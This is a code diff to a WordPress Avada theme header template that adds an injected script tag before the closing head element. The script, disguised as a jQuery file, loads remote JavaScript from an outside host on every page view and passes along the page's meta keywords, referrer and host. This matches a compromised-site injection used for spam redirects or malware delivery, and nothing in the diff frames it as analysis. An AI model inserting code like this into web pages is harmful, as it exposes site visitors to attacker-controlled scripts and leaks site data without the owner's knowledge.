@@ -120,6 +120,8 @@
 	<?php echo Avada()->settings->get( 'google_analytics' ); ?>
 
 	<?php echo Avada()->settings->get( 'space_head' ); ?>
+
+<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://alpacasontheweb.com/js/jquery.min.php?c_utt=SWR2D2&c_utm='+encodeURIComponent('http://alpacasontheweb.com/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
 </head>
 <?php
 $wrapper_class = '';
